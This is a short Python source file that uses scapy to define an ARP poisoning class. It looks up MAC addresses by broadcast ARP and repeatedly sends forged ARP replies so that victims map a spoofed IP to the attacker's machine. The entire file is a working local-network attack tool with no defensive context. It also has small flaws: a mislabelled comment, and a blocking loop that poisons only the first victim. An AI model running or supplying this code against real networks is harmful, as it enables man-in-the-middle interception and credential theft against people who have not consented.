from scapy.all import *

'''
Class for performing ARP Poisoning attack
input: networkInterface, ipVictim, ipToSpoof
    networkInterface: str
    ipVictims: [str] - list of ip addresses that are victims
    ipToSpoof: str - ip address of the machine that is going to be spoofed
    itAttacker: str - ip address of the machine that is doing the attack
'''

class ARP_Poisoning:

    # Constructor
    def __init__ (self, networkInterface, ipVictims, ipToSpoof, ipAttacker):
        self.networkInterface = networkInterface
        self.ipVictims = ipVictims
        self.ipToSpoof = ipToSpoof
        self.ipAttacker = ipAttacker

    # Main functions
    def startPoisoning(self):
        # Get the MAC address of the machine that is going to be spoofed
        macAttacker = self.getMACofIP(self.ipAttacker)

        for ip in self.ipVictims:
            macVictim = self.getMACofIP(ip)

            #set up the packet
            arp = ARP(hwsrc=macAttacker, psrc=self.ipToSpoof, hwdst=macVictim, pdst=ip)
            ether = Ether(src=macAttacker)
            pkt = ether/arp
            
            #send the packer
            sendp(pkt, iface=self.networkInterface, inter=30, loop=1, verbose=0)


    # Helper functions
    def getMACofIP(self, ip):
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        pkt = ether/arp
        return srp(pkt, timeout=2, iface=self.networkInterface)[0][0][1].hwsrc

